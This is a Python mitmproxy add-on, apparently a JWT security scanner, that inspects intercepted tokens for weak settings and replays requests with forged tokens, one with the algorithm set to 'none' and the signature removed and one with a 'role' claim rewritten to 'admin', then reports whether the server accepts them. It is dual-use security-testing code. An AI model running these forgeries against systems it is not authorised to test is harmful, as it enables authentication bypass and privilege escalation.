import base64
from log import log
import jwt
import json
from mitmproxy import http, ctx

class JWTAnalyzer:
    def __init__(self):
        self.fuzzedJWTs = set()

    def evaluateJWT(self, JWT, flow):
        if "Active-Attack" in flow.request.headers.get("X-Fuzzer", ""):
            self.evaluateAttackResponse(flow, flow.request.headers.get("X-Fuzzer"))
            return

        if JWT in self.fuzzedJWTs:
            return
        
        if len(JWT.split(".")) != 3:
            return


        log.info(f"JWT extracted for path {flow.request.path}: {JWT}. Evaluating...")
        self.fuzzedJWTs.add(JWT)

        try:
            unverifiedHeader = jwt.get_unverified_header(JWT)
            unverifiedPayload = jwt.decode(JWT, options={"verify_signature": False})

            # --- TEST 1: The 'none' Algorithm Vulnerability ---
            # Attackers can change 'alg' to 'none', remove the signature, and forge data.
            alg = unverifiedHeader.get("alg", "").lower()
            if alg == "none":
                log.warning(f"JWT 'none' algorithm is used by the client!")
            

            # --- TEST 2: Weak/Insecure Signature Algorithms ---
            # Symmetric algorithms (like HS256) are prone to brute-forcing if secrets are weak.
            # Asymmetric (like RS256) is safer. If HS256 is used, flag it for manual review.
            if alg == "hs256":
                log.warning(f"JWT uses symmetric HS256. Risk of secret brute-forcing.")

            # --- TEST 3: Sensitive Information Leakage in Payload ---
            # JWT payloads are NOT encrypted; they are only base64 encoded. anyone can read them.
            sensitiveKeywords = ["password", "secret", "ssn", "role", "admin"]
            payload_string = json.dumps(unverifiedPayload).lower()
            
            for keyword in sensitiveKeywords:
                if keyword in payload_string:
                    log.warning(f"Potential sensitive data leakage; JWT Payload contains keyword '{keyword}': {json.dumps(unverifiedPayload, indent=4)}")
                if keyword == "role":
                    self.attackRoleChangeToAdmin(flow, JWT, "role", "admin", unverifiedPayload["data"][keyword])

            # change role to admin
            #if hs256, then compute hashes using hashcat
            # if rs256, algorithm confusion

            # --- TEST 4: Missing Expiration (No 'exp' claim) ---
            # If a token never expires, a stolen token is valid forever.
            if "exp" not in unverifiedPayload:
                log.warning(f"JWT is missing an expiration timestamp ('exp' claim)")

            #lack of signature verification
            
            self.attackWithAlgNone(flow, JWT)

        except Exception as e:
            log.error(e)
            pass

        return
    
    def attackWithAlgNone(self, flow, JWT):
        log.debug("ATTACK: JWT algorithm switched to none")
        # Replay request with algorithm none
        JWTwithAlgNone = self.buildJWTWithAlgNone(JWT)
        attackFlow = flow.copy()

        attackFlow.request.headers["X-Fuzzer"] = "Active-Attack-AlgNone"
        attackFlow.request.headers["Authorization"] = f"Bearer {JWTwithAlgNone}"

        attackFlow.metadata["originalStatus"] = flow.response.status_code
        log.info(f"status_code {flow.response.status_code}")
        ctx.master.commands.call("replay.client", [attackFlow])

    def attackRoleChangeToAdmin(self, flow, JWT, claimToChange, newClaimValue, previousValue):
        log.debug(f"ATTACK: JWT claim {claimToChange} switched to {newClaimValue} from {previousValue}")
        JWTWithClaimChanged = self.changeJWTPayloadClaim(JWT, claimToChange, newClaimValue)
        
        attackFlow = flow.copy()

        attackFlow.request.headers["X-Fuzzer"] = "Active-Attack-RoleClaim"
        attackFlow.request.headers["Authorization"] = f"Bearer {JWTWithClaimChanged}"

        attackFlow.metadata["originalStatus"] = flow.response.status_code
        log.info(f"status_code {flow.response.status_code}")
        ctx.master.commands.call("replay.client", [attackFlow])


    def buildJWTWithAlgNone(self, orgJWT: str) -> str:
        try:
            header64, payload64, _ = orgJWT.split(".")
            paddedHeader = header64 + "=" * divmod(len(header64), 4)[1]
            headerJSON = json.loads(base64.urlsafe_b64decode(paddedHeader))

            headerJSON["alg"] = "none"

            newHeaderBytes = json.dumps(headerJSON).encode("utf-8")
            newHeader64 = base64.urlsafe_b64encode(newHeaderBytes).decode("utf-8").rstrip("=")

            return f"{newHeader64}.{payload64}."

        except Exception as e:
            log.exception(f"Failed to change JWT algorithm to none")

    def changeJWTPayloadClaim(self, orgJWT: str, claimToChange, newClaimValue) -> str:
        try:
            header64, payload64, signature64 = orgJWT.split(".")
            paddedPayload = payload64 + "=" * divmod(len(payload64), 4)[1]
            payloadJSON = json.loads(base64.urlsafe_b64decode(paddedPayload))

            payloadJSON[claimToChange] = newClaimValue

            newPayloadBytes = json.dumps(payloadJSON).encode("utf-8")
            newPayload64 = base64.urlsafe_b64encode(newPayloadBytes).decode("utf-8").rstrip("=")

            return f"{header64}.{newPayload64}.{signature64}"

        except Exception as e:
            log.exception(f"Failed to change claim {claimToChange} to {newClaimValue}")
    
    def evaluateAttackResponse(self, attackFlow: http.HTTPFlow, attackHeader):
        log.debug("Evaluating attack response")
        originalStatus = attackFlow.metadata.get("originalStatus")
        log.debug(f"Original HTTP status: {originalStatus}")
        attackStatus = attackFlow.response.status_code
        log.debug(f"New HTTP status: {attackStatus}")
        path = attackFlow.request.path

        message = ""
        if attackStatus in [401, 403, 500]:
            match attackHeader:
                case "Active-Attack-AlgNone":
                    message = "rejected 'alg: none' signature bypass"
                case "Active-Attack-RoleClaim":
                    message = "rejected claim change"
                    
            log.info(f"[✓] Secure: Server successfully {message} on {path} ({attackStatus})")
        elif attackStatus == 200 or attackStatus == originalStatus:
            match attackHeader:
                case "Active-Attack-AlgNone":
                    message = "'alg: none' signature accepted"
                case "Active-Attack-RoleClaim":
                    message = "role claim change accepted"

            log.critical(f"[⚠️] VULNERABILITY FOUND: {message} on {path} ({attackStatus})")

    def evaluateCORS():
        # 
        return